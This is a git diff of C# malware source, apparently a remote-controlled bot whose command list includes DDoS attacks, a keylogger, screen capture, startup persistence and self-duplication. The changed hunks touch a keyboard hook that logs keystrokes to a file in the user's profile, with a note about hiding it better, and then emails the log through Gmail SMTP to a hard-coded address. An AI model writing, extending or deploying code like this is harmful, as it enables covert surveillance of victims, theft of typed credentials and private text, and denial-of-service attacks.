@@ -178,22 +178,19 @@ namespace Karios
                     } //TODO: Handle this Exception.
 
                     var preppedCommand = commands.Split(' ');
-#pragma warning disable 1587
-                    /// <summary>
-                    /// COMMANDS : IMPORTANT : 
-                    /// 0 = Online 
-                    /// 1 = DDOSOnline
-                    /// 2 = DDOSIP
-                    /// 3 = KeyloggerOnline
-                    /// 4 = Keylogger email
-                    /// 5 = Capture screen
-                    /// 6 = Startup
-                    /// 7  = Duplication
-                    /// 8 = Website
-                    /// 9 = Reverses everything
-                    /// </summary>
-#pragma warning restore 1587
-
+                    // <summary>
+                    // COMMANDS : IMPORTANT : 
+                    // 0 = Online 
+                    // 1 = DDOSOnline
+                    // 2 = DDOSIP
+                    // 3 = KeyloggerOnline
+                    // 4 = Keylogger email
+                    // 5 = Capture screen
+                    // 6 = Startup
+                    // 7  = Duplication
+                    // 8 = Website
+                    // 9 = Reverses everything
+                    // </summary>
                     if (preppedCommand[0] == "Online=True")
                     {
                         _online = true;
@@ -231,7 +228,7 @@ namespace Karios
         {
             try
             {
-                Console.WriteLine("Recording key works");
+                //Console.WriteLine("Recording key works");
                 if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
                 var appName = AppDomain.CurrentDomain.FriendlyName;
                 var vkCode = Marshal.ReadInt32(lParam);
@@ -240,7 +237,6 @@ namespace Karios
                 // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                 pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + machineName + ".txt"; // TODO - get more secret location.
                 var sw = new StreamWriter(pathToLog, true);
-                Console.WriteLine("About to write");
                 if ((Keys)vkCode != Keys.Enter)
                 {
                     if ((Keys)vkCode == Keys.Space)
@@ -257,14 +253,19 @@ namespace Karios
                     sw.WriteLine((Keys)vkCode);
                     Console.WriteLine((Keys)vkCode);
                 }
+                sw.Close();
+                Console.WriteLine("Closed");
             }
             catch
             {
                 Console.WriteLine("Something went wrong, im dieing");
             }  
+            Console.WriteLine("Trying to send emailsss");
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             try
             {
+                Console.WriteLine("Testing emails");
+                MessageBox.Show("Sending Email....");
                 var mail = new MailMessage();
                 var smtpServer = new SmtpClient("smtp.gmail.com");
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
